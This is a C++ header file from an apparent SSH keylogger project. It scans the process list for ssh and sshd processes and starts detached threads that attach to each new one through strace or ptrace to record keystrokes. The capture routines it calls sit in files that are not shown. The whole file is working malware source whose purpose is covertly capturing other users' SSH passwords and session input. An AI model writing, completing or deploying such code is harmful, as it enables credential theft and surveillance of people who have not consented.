#ifndef KEYLOGGER_KEYLOGGER_HPP
#define KEYLOGGER_KEYLOGGER_HPP

#include <iostream>
#include <cstring>
#include <thread>
#include <algorithm>
#include <fcntl.h>
#include <boost/regex.hpp>
#include <boost/program_options.hpp>

#include "process.hpp"
#include "parsing.hpp"
#include "ptrace.hpp"
#include "strace.hpp"

using namespace boost::program_options;

std::vector<Process> get_proc_list_of_ssh(){
    std::string command("ps -auxw");
    std::array<char, 128> buffer{};
    std::vector<Process> proc_list{};
    DEBUG_STDOUT("Opening reading PIPE from ps process output");
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe)
    {
        DEBUG_STDERR("Couldn't 'ps -auxw' command");
        return {};
    }
    fgets(buffer.data(), 128, pipe);
    while (fgets(buffer.data(), 128, pipe) != nullptr) {
        std::string proc_info{buffer.data()};
        if(proc_info.find("ssh") != std::string::npos){
            std::tuple<std::string, uint16_t, std::string, std::string> splitted_proc_info = parsing_utils::split_proc_info(proc_info);
            proc_list.emplace_back(Process{std::get<0>(splitted_proc_info),      //user
                                           std::get<1>(splitted_proc_info),      //pid
                                           std::get<2>(splitted_proc_info),      //cmd
                                           std::get<3>(splitted_proc_info)});    //args
        }
    }
    pclose(pipe);
    DEBUG_STDOUT("Closing PIPE");
    return proc_list;
}

void check_ps(const std::string& flag){
    std::vector<Process> proc_list = get_proc_list_of_ssh();
    for (auto &proc : proc_list){
        if (proc.find_sshd()){
            HandledProcesses& obj = HandledProcesses::getInstance();
            auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
            if(it == obj.get_current_proc_list().end()){
                obj.get_current_proc_list().emplace_back(proc.get_pid());
                if (flag == "strace") {
                    std::thread sshd_keylog(strace_ns::sshd_keylogger, proc.get_pid());
                    sshd_keylog.detach();
                }
                else if (flag == "ptrace") {
                    std::thread sshd_keylog(ptrace_ns::ptrace_loop, proc.get_pid());
                    sshd_keylog.detach();
                }
            }
        }
        else if(proc.find_ssh()){
            HandledProcesses& obj = HandledProcesses::getInstance();
            auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
            if(it == obj.get_current_proc_list().end()){
                obj.get_current_proc_list().emplace_back(proc.get_pid());
                if (flag == "strace") {
                    std::thread ssh_keylog(strace_ns::ssh_keylogger, proc.get_pid());
                    ssh_keylog.detach();
                }
            }
        }
    }
}

#endif //KEYLOGGER_KEYLOGGER_HPP
